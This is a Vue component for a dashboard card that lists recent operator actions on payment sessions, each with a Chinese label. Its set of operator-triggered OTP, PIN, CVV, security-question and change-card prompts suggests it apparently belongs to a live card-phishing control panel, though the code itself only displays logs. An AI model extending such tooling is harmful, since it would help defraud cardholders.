<script setup lang="ts">
import { ref, onMounted } from 'vue';

interface LogEntry {
  sessionId: number;
  action: string;
  message: string;
  createdAt: string;
}

const logs = ref<LogEntry[]>([]);

const actionLabels: Record<string, string> = {
  otp_verify: '发送了OTP验证', custom_otp_verify: '自定义OTP验证', custom_otp_tail: 'OTP验证(自定义尾号)',
  email_verify: '发送了邮箱验证', pin_verify: '发送了PIN验证',
  cvv_verify: 'CVV验证', app_verify: 'APP验证',
  question_verify: '问题验证', change_card: '换卡支付',
  card_error: '卡片错误', otp_error: '验证码错误',
  custom_prompt: '自定义提示', change_card_prompt: '换卡提示',
  redirect_complete: '跳转完成', approve: '已通过', reject: '已拒绝',
  app_verify_done: 'APP验证完成', app_verify_fail: '未完成验证'
};

onMounted(async () => {
  try {
    const res = await fetch('/api/payment/sessions');
    const json = await res.json();
    if (json.code === '0000') {
      const all = (json.data || []).filter((s: any) => s.operatorAction).slice(0, 8);
      logs.value = all.map((s: any) => ({
        sessionId: s.sessionId,
        action: actionLabels[s.operatorAction] || s.operatorAction || '未知操作',
        message: s.operatorMessage || '',
        createdAt: s.updatedAt || s.created_at || '',
      }));
    }
  } catch {}
});
</script>

<template>
  <NCard :bordered="false" class="card-wrapper">
    <template #header>
      <div class="log-header">
        <span>更新日志</span>
        <span class="log-more">更多动态</span>
      </div>
    </template>
    <NListItem v-if="logs.length === 0">
      <NThing title="暂无操作记录" description="等待运营操作产生记录" />
    </NListItem>
    <NListItem v-for="log in logs" :key="log.sessionId + log.createdAt">
      <NThing :title="`#${log.sessionId} ${log.action}`" :description="log.message || '—'">
        <template #footer>
          {{ log.createdAt }}
        </template>
      </NThing>
    </NListItem>
  </NCard>
</template>

<style scoped>
.log-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  font-weight: 700;
  font-size: 16px;
}
.log-more {
  font-size: 13px;
  color: var(--n-text-color-3);
  cursor: pointer;
}
</style>
